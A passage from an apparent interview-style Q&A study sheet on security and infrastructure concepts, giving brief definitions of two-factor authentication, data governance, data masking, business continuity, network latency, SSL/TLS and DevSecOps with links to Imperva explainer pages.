<p>Today, 2FA is commonly employed in online banking websites, social media platforms and e-commerce sites as a way to harden access controls to the more sensitive areas of a web application (e.g., admin panels or areas that store credit details and/or personal data).</p>

<p>Two-factor authentication also enables businesses and public institutions to be more productive and efficient, allowing employees to perform remote tasks with far less security concerns.</p>

> Read the link 
    >>https://www.imperva.com/learn/application-security/2fa-two-factor-authentication/
<br />

<h2><b><i>Question :- What is Data Governance? A Data Governance Definition?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Data governance is the practice of identifying important data across an organization, ensuring it is of high quality, and improving its value to the business.</p>

> Read the link
    >> https://www.imperva.com/learn/data-security/data-governance/
<br />

<h2><b><i>Question :- What is Data Masking?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Data masking is a way to create a fake, but a realistic version of your organizational data. The goal is to protect sensitive data, while providing a functional alternative when real data is not needed—for example, in user training, sales demos, or software testing.</p>

<p>Data masking processes change the values of the data while using the same format. The goal is to create a version that cannot be deciphered or reverse engineered. There are several ways to alter the data, including character shuffling, word or character substitution, and encryption.</p>

> Read the link
    >> https://www.imperva.com/learn/data-security/data-masking/
<br />

<h2><b><i>Question :- What is business continuity?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>In an IT context, business continuity is the capability of your enterprise to stay online and deliver products and services during disruptive events, such as natural disasters, cyberattacks and communication failures.</p>

<p>The core of this concept is the business continuity plan — a defined strategy that includes every facet of your organization and details procedures for maintaining business availability.</p>

> Read the link
    >> https://www.imperva.com/learn/availability/business-continuity-planning/
<br />

<h2><b><i>Question :- What is Network Latency?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Measured in milliseconds, network latency is the time it takes a site visitor to connect to your webserver, their request to be processed and the server to begin sending data. Several factors impact latency, including:</p>

+ <strong>Server performance - </strong>
<p>There is a correlation between server performance metrics—including server speed, hardware used (e.g., HDD/SDD drives) and available RAM—and your site latency.</p>

+ <strong>Round-trips - </strong>
<p>A round-trip is the journey taken by an object request (e.g., HTML files, stylesheets and script files) to your webserver and back to the user. Round-trip time (RTT) is primarily affected by the distance between webserver and user, as well as the number of intermediate points through which a connection travels.</p>

<p>A slight change in latency can have a perceivable effect on page load time and user experience (UX). This is especially true for commercial websites (i.e., e-commerce sites), where high latency can significantly impact overall performance and therefore UX.</p>
<br />

<h2><b><i>Question :- What is SSL/TLS?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Secure Sockets Layer (SSL) and its successor, Transport Layer Security (TLS) are protocols that provide private, encrypted communication across networks.</p>

> <strong>The benefits of an SSL/TLS connection include:</strong>

+ <strong>Privacy</strong>
    <p>Communication between two connected networks is secured by a unique key that can’t be obtained by a third party.</p>

+ <strong>Authentication</strong>
    <p>The identity of the communicating parties is verified using a public-key cryptogram.</p>

+ <strong>Integrity</strong>
    <p>An authentication algorithm determines whether a message has been altered.</p>

<br />

<h2><b><i>Question :- What is DevSecOps?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>DevSecOps is a joint effort by development, security and operations personnel to ensure that products are released efficiently and securely from the start. The model was developed to address security vulnerabilities that arise when security is introduced too late in the development process. This requires rewriting the unsecure code, delays release to production, and risks deployment of software with severe security issues.</p>

<p>DevSecOps mandates shifting left security in the development lifecycle. Instead of happening at the end of the cycle, security starts from day one. Tools and processes are provided to operations and development teams to help them make security decisions, from the planning stage, through development, testing and deployment. At the same time, the security team adjusts these tools and processes according to development and operational requirements to maintain an agile work environment.</p>

<p>The process of transitioning to a DevSecOps team is not easy, but using the right tools can simplify adoption of the process and collaboration among dev, ops, and security teams.</p>
<br />
